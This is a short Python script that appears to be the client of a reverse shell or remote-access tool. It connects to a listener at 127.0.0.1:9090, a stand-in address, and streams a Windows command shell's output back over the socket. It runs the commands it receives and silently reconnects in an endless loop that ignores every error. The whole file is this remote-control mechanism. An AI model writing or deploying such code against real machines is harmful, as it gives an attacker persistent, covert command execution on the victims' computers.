from bestSocket import BestSocket
from bCCmd import BCCmd
from modules import execute

URL = '127.0.0.1'
PORT = 9090

while 1:
    prefix = b''
    try:
        bs = BestSocket(URL, PORT, "client")
        bc = BCCmd()

        while True:
            bc.stdall('err', bs.conn.send, b'|E')
            bc.stdall('out', bs.conn.send, b'|O', prefix)

            bs.send('_ ')
            rawdata = bs.recv()

            if not rawdata:
                break
            elif rawdata[0] == '/':
                execute(rawdata[1:], bc, bs)
            else:
                prefix = rawdata.encode('cp866')
                bc.send(rawdata)
            bc.flush()
    except Exception:
        continue
